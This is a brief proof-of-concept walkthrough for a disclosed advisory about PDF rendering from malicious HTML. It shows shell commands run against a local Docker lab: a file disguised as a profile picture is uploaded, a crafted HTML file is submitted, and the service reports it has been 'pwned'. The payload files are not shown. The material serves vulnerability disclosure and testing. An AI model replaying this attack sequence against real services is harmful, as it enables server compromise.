### Pdf rendering from malicious html file [GHSA_97m3_52wr_xvv2][1]

```bash
$ docker build --tag host.ghsa_97m3 --file Dockerfile .
$ docker run -p 8002:8000 -d -t --name ghsa_97m3 host.ghsa_97m3
$ curl.exe -X GET http://127.0.0.1:8002/status
Everything seems fine
$ Set-Variable -Name X -Value (curl.exe -c cookiejar -X GET http://127.0.0.1:8002/token)
$ curl.exe -b cookiejar --header "X-CSRF-TOKEN:$X" -F "profile=@profile.png" -X POST http://127.0.0.1:8002/upload/profile/photo
saved profile picture to /uploads/v1/user/profile.png # <--- not a real picture :)
$ curl.exe -b cookiejar --header "X-CSRF-TOKEN:$X" -F "source=@vuln_tag.html" -X POST http://127.0.0.1:8002/ghsa_97m3
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.
$ curl.exe -X GET http://127.0.0.1:8002/status
You've been pwned ! # <--- Oh yes !
```

[1]: https://github.com/advisories/GHSA-97m3-52wr-xvv2